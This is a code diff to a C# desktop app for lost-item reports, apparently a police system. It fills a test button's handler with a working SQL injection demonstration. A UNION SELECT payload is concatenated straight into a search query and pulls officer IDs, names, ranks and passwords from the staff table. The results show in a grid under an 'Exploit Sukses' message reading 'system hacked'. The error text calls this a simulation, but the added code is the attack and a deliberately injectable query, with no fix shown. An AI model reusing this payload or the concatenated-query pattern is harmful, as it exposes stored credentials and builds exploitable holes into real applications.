@@ -255,7 +255,38 @@ namespace STPLapp
 
         private void btnTest_Click(object sender, EventArgs e)
         {
-            
+            cmbKategori.Text = "Laporan Hilang";
+
+            string payloadSQLi = "xyz' UNION SELECT nrp, nama_petugas, pangkat, password_petugas, 'TERINJEKSI', 'LOKASI EXPLOIT', NOW(), 'Tersimpan', nrp, nama_petugas FROM tb_petugas -- ";
+
+            txtSearch.Text = payloadSQLi;
+
+            MySqlConnection conn = new MySqlConnection(connectionString);
+            try
+            {
+                conn.Open();
+
+                string query = "SELECT * FROM vw_laporan_hilang_lengkap WHERE no_stpl LIKE '%" + payloadSQLi + "%' OR nama_pelapor LIKE '%" + payloadSQLi + "%'";
+
+                MySqlCommand cmd = new MySqlCommand(query, conn);
+                MySqlDataAdapter adapter = new MySqlDataAdapter(cmd);
+                DataTable dt = new DataTable();
+                adapter.Fill(dt);
+
+                bindingSourceGudang.DataSource = dt;
+                dgvGudang.DataSource = bindingSourceGudang;
+
+                MessageBox.Show("s̶͕̺̐̈́ͅy̵͙̰̤̣̑͒̈́̂̓̽̇͘͘s̸̢̲͈̱̦̫̺͕͚̥̥̗̤̣̥͘t̴̢̨̢̖͙͕̥̹͕̥̣̘͕͈̓͋̅̇̔̏̀́͘e̶̡͚̖̺̟̺̭̠̰͑̍͌̅̀̒̈́̉ḿ̸̛̮̰͙̙̣̝̣̣̯̖͓̘̭̿͜ ̵̢̭̞̺̱͇̖̑̀̓̈́̅̄̉̍͗͝ḣ̶̼̤̝̠͈̗̙̩͖͕͓̉̈́̆̾̎̈́̀̂ä̴̧͎͚̞͙̻̙͇̙́̇̄͊c̶̡̬̖̘̟̪̣̾͛́̾́̐͐̉̅̅̄̕͘ḳ̶̨̘͉̤̮̙̙͒͑̄͒͛͋͑̿̈̂̐͑͜͜͝è̴̡̡̺͉̣͆͛̽̚d̴̡͈̥̈̆͗̎̌̇̈́͊͒̒̕͝ͅ\n\ns̶͕̺̐̈́ͅy̵͙̰̤̣̑͒̈́̂̓̽̇͘͘s̸̢̲͈̱̦̫̺͕͚̥̥̗̤̣̥͘t̴̢̨̢̖͙͕̥̹͕̥̣̘͕͈̓͋̅̇̔̏̀́͘e̶̡͚̖̺̟̺̭̠̰͑̍͌̅̀̒̈́̉ḿ̸̛̮̰͙̙̣̝̣̣̯̖͓̘̭̿͜ ̵̢̭̞̺̱͇̖̑̀̓̈́̅̄̉̍͗͝ḣ̶̼̤̝̠͈̗̙̩͖͕͓̉̈́̆̾̎̈́̀̂ä̴̧͎͚̞͙̻̙͇̙́̇̄͊c̶̡̬̖̘̟̪̣̾͛́̾́̐͐̉̅̅̄̕͘ḳ̶̨̘͉̤̮̙̙͒͑̄͒͛͋͑̿̈̂̐͑͜͜͝è̴̡̡̺͉̣͆͛̽̚d̴̡͈̥̈̆͗̎̌̇̈́͊͒̒̕͝ͅ",
+                                "Exploit Sukses", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Error saat simulasi: " + ex.Message, "Sistem Proteksi", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            finally
+            {
+                conn.Close();
+            }
         }
 
         private void btnReset_Click(object sender, EventArgs e)
